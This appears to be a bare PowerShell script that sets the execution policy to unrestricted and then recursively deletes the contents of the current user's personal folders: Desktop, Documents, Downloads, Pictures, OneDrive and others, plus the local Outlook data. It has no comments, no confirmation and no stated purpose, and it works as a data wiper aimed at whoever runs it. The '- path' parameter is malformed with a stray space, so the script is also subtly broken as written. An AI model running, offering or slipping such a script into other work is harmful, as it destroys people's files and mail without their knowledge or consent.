pause

Set-ExecutionPolicy unrestricted

$env:username
$name = $env:username
remove-item - path c:\users\$name\desktop\* -recurse
remove-item - path c:\users\$name\documents\* -recurse
remove-item - path c:\users\$name\contacts\* -recurse
remove-item - path c:\users\$name\downloads\* -recurse
remove-item - path c:\users\$name\favorites\* -recurse
remove-item - path c:\users\$name\links\* -recurse
remove-item - path c:\users\$name\music\* -recurse
remove-item - path c:\users\$name\onedrive\* -recurse
remove-item - path c:\users\$name\pictures\* -recurse
remove-item - path c:\users\$name\saved games\* -recurse
remove-item - path c:\users\$name\searches\* -recurse
remove-item - path c:\users\$name\videos\* -recurse
remove-item - path C:\Users\$name\AppData\Local\Microsoft\Outlook\* -recurse